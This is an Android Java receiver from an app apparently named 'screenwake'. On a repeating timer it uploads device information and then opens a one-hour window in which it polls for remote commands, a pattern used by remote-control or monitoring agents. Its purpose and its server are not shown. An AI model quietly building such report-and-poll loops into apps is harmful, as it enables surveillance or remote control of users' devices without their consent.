package com.example.screenwake;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class TaskReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        if (intent == null ||
                !AlarmScheduler.ACTION_TIMER.equals(intent.getAction())) {
            return;
        }

        Context c = context.getApplicationContext();

        if (!ConfigManager.isEnabled(c) ||
                ConfigManager.isPaused(c)) {

            LogManager.log(c,
                    "收到定时广播，但定时器未启用或已暂停");
            return;
        }

        // 防止上一轮上传尚未完成时重复触发
        if (DeviceUploader.isRunning()) {

            LogManager.log(c,
                    "上一轮上传仍在运行，本次重复触发已忽略");
            return;
        }

        long now = System.currentTimeMillis();
        long planned = ConfigManager.getNextTrigger(c);

        long delayMinutes = 0L;

        if (planned > 0L && now > planned) {
            delayMinutes = (now - planned) / 60000L;
        }

        ConfigManager.setLastTrigger(c, now);
        ConfigManager.setNextTrigger(c, 0L);

        LogManager.log(c,
                "定时任务触发，实际时间：" + now
                        + "，计划时间：" + planned
                        + "，延迟分钟：" + delayMinutes);

        // 启动前台服务
        CycleService.start(c);

        // 上传设备信息，最多尝试五次
        DeviceUploader.send(c,
                new DeviceUploader.Callback() {

                    @Override
                    public void onComplete(
                            boolean success,
                            String message) {

                        LogManager.log(c,
                                "本轮上传结束，结果："
                                        + (success ? "成功" : "失败")
                                        + "，信息：" + message);

                        try {

                            // 上传成功或五次失败后，都开启一小时指令窗口
                            CommandPoller.startWindow(c);

                        } catch (Exception e) {

                            LogManager.log(c,
                                    "启动指令窗口异常：" + e.getMessage());
                        }

                        try {

                            // 安排下一轮定时任务
                            AlarmScheduler.scheduleNext(c);

                        } catch (Exception e) {

                            LogManager.log(c,
                                    "安排下一轮任务异常：" + e.getMessage());
                        }
                    }
                });
    }
}


